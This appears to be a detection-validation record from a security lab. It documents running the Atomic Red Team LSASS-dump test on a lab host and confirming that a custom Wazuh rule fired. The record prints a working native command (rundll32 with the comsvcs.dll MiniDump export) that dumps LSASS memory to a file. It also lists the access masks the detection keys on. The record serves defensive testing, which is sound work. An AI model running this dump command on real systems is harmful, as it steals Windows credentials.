# T1003.001 — LSASS Memory (comsvcs.dll MiniDump)

Validates: [DET-004](../modules/detection-pipeline/docs/detections/det-004-lsass-credential-dumping.md)
(Wazuh custom 100003)

## Commands

Ran the Atomic Red Team T1003.001 comsvcs.dll MiniDump test on
`windows-victim` (installed via Invoke-AtomicTest as part of the W1 ART
install — see `../modules/adversary-emulation/docs/campaign-log.md`):

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers <n>
```

Which resolves to the underlying technique — dumping the LSASS process
via the undocumented `MiniDump` export of `comsvcs.dll` (no external
dumping tool required, everything is native `rundll32`):

```powershell
$procID = (Get-Process lsass).Id
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $procID C:\Temp\lsass_dump.dmp full
```

## Expected telemetry

Sysmon EID 10 (`process_access`) with `SourceImage` = `rundll32.exe`,
`TargetImage` = `C:\Windows\system32\lsass.exe`, and `GrantedAccess` one
of the sensitive masks (`0x1010`, `0x1410`, `0x1438`, `0x143a`,
`0x1fffff`).

## Rules fired

- Custom Wazuh rule 100003 `Detection Platform: Sensitive handle to LSASS - credential
  dumping pattern [T1003.001]`, level 12 — fired **twice** (rundll32
  opens the LSASS handle across two distinct access events for this
  technique).
- Stock 92900 (`Lsass process was accessed ... possible credential dump`)
  is the same family of alert but was previously observed firing on
  benign `svchost.exe` read access — the FP case custom rule 100003
  is scoped to exclude via its `GrantedAccess` mask allowlist.

## Cleanup

```powershell
Remove-Item C:\Temp\lsass_dump.dmp -Force
```

Coordinate before running — AV/EDR may block or quarantine the dump file
or `rundll32` invocation.

## Evidence

**Not yet captured:** a screenshot of rule 100003 firing. The earlier
stock-92900 FP-case screenshot (`shared/evidence/det004-lsass-92900-svchost.png`)
is also not in the repo.
The planned captures are listed in `shared/evidence-index.md`.

## Notes

First ART-driven test of the W1 close-out after the install saga (disk
space, execution-policy, installer-script-vs-module issues — see
`../modules/adversary-emulation/docs/campaign-log.md`). Confirmed the firing process was the planned
test, not unexpected activity, before marking VALIDATED.
